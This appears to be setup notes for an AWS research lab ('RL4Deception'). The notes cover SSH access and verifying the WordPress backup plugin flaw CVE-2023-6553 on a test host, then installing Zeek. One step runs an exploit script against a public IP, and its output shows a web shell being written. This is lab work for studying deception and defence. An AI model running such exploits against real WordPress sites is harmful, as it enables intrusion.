- get controller IP
```
aws ec2 describe-instances \
  --filters "Name=tag:Name,Values=Controller" \
  --query "Reservations[].Instances[].PublicIpAddress" \
  --output text
```

- get internal IPs
```
aws ec2 describe-instances \
  --query 'Reservations[*].Instances[*].PrivateIpAddress' \
  --output text
```

- ssh into controller
```
chmod 400 RL4Deception.pem
ssh -i Network_tf/RL4Deception.pem ubuntu@3.148.118.121
```

- copy files from local to the controller, e.g., hosts.txt
```
scp -i Network_tf/RL4Deception.pem hosts.txt ubuntu@3.148.118.121:/home/ubuntu/
```

- verify SSH connectivity to all hosts
```
./checkSSH.sh 
```

```
📡 Verifying SSH connectivity to all hosts as 'ubuntu'...

IP Address      Status    
----------      ------    
10.0.1.204      ✅
10.0.2.87       ✅
10.0.2.226      ✅
10.0.3.151      ✅
10.0.3.65       ✅
10.0.3.136      ✅
10.0.3.67       ✅
```

- verify the existence of CVE-2023-6553 on PublicWeb1

```
ssh -i ~/RL4Deception.pem ubuntu@10.0.1.204
ls -l /var/www/html/wp-content/plugins/
grep -i version /var/www/html/wp-content/plugins/backup-backup/backup-backup.php
```

```
   *     Version: 1.3.7
  if (!defined('BMI_VERSION')) {
    define('BMI_VERSION', '1.3.7');
```

- exploit the backup vulnerability at PublicWeb1

```
cd Attacker/CVE-2023-6553/
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt
python exploit.py -u http://3.144.10.220
```

```
(venv) yinuodu@S3Ds-MacBook-Pro-10 CVE-2023-6553 % python exploit.py -u http://3.144.10.220      

http://3.144.10.220 is vulnerable to CVE-2023-6553
Initiating shell deployment. This may take a moment...
Writing... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
Shell written successfully.
# 
```

- install Zeek
```
sudo apt update -y
sudo apt install -y wget gnupg lsb-release
echo 'deb http://download.opensuse.org/repositories/security:/zeek/xUbuntu_22.04/ /' | sudo tee /etc/apt/sources.list.d/security:zeek.list
curl -fsSL https://download.opensuse.org/repositories/security:zeek/xUbuntu_22.04/Release.key | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/security_zeek.gpg > /dev/null
sudo apt update
sudo apt install zeek-6.0
```